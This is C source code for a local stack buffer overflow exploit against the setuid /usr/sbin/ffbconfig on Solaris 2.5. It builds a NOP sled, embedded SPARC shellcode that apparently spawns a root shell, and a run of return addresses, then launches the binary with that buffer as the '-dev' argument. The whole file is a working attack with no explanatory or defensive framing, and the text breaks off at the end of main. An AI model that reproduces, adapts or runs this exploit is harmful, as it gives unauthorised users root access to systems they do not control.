/*
This works on Solaris 2.5 wiz /usr/sbin/ffbconfig
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

#define BUF_LENGTH      128
#define EXTRA           256
#define STACK_OFFSET    128
#define SPARC_NOP       0xa61cc013

u_char sparc_shellcode[] =
"\x82\x10\x20\xca\xa6\x1c\xc0\x13\x90\x0c\xc0\x13\x92\x0c\xc0\x13"
"\xa6\x04\xe0\x01\x91\xd4\xff\xff\x2d\x0b\xd8\x9a\xac\x15\xa1\x6e"
"\x2f\x0b\xdc\xda\x90\x0b\x80\x0e\x92\x03\xa0\x08\x94\x1a\x80\x0a"
"\x9c\x03\xa0\x10\xec\x3b\xbf\xf0\xdc\x23\xbf\xf8\xc0\x23\xbf\xfc"
"\x82\x10\x20\x3b\x91\xd4\xff\xff";

u_long get_sp(void)
{
  __asm__("mov %sp,%i0 \n");
}

void main(int argc, char *argv[])
{
  char buf[BUF_LENGTH + EXTRA];
  long targ_addr;
  u_long *long_p;
  u_char *char_p;
  int i, code_length = strlen(sparc_shellcode),so;

  long_p = (u_long *) buf;

  for (i = 0; i < (BUF_LENGTH - code_length) / sizeof(u_long); i++)
    *long_p++ = SPARC_NOP;

  char_p = (u_char *) long_p;

  for (i = 0; i < code_length; i++)
    *char_p++ = sparc_shellcode[i];

  long_p = (u_long *) char_p;

  targ_addr = get_sp() - STACK_OFFSET;
  for (i = 0; i < EXTRA / sizeof(u_long); i++)
    *long_p++ =targ_addr;

  printf("Jumping to address 0x%lx B[%d] E[%d] SO[%d]\n",
targ_addr,BUF_LENGTH,EXTRA,STACK_OFFSET);

  execl("/usr/sbin/ffbconfig", "ffbconfig", "-dev", buf,(char *) 0);
